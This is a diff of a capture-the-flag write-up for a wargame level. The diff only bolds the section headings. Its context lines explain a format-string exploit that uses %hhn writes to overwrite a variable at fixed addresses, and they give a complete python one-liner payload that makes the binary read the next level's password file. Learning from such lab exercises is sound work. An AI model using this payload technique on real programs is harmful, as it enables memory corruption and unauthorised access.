@@ -8,7 +8,7 @@ However, we can still take advantage of `%n`, using the `h` flag : `%hn` is for 
 
 Here's what we'll do : we'll break down the 4-byte int, specify the 4 bytes as individual addresses and fill them with the corresponding byte.
 
-## The value
+## **The value**
 
 Cutter reveals our variable should have the value `0x1025544`.
 
@@ -20,7 +20,7 @@ This can be broken down in four :
 
 The `%n` count doesn't reset, so we'll write the total in ascending order. We'll need to write `1` char and fill the first byte ; write `1` char and fill the second byte ; write `66` chars and fill the last byte ; and write `17` chars and fill the third byte.
 
-## The address
+## **The address**
 
 Cutter tells us the variable to change.
 
@@ -33,7 +33,7 @@ This gives us our four addresses (without forgetting to reverse the order for en
 - Write value `0x55` to address `0x08049811`
 - Write value `0x44` to address `0x08049810`
 
-## The buffer
+## **The buffer**
 
 Quick experimentation reveals the beginning of the buffer is at spot `%12$`.
 
@@ -89,7 +89,7 @@ A%23 $hhn C%22 $hhn EEEE FFFF GGGG HHHH 0x08049810 0x08049811
 UU%2 0$hh nWWW XXXX YYYY ZZZZ ++%2 1$hh n...
 ```
 
-## The exploit
+## **The exploit**
 
 We turn that into something we can output in Python :
 
@@ -103,7 +103,7 @@ After a little cleanup, we get :
 python -c 'print("_%23$hhn_%22$hhn________________\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08__________________________________%20$hhn_________________%21$hhn")'
 ```
 
-## The flag
+## **The flag**
 
 Now we just have to pipe that to `level4`, who directly runs `system ("/bin/cat /home/user/level5/.pass");`
 
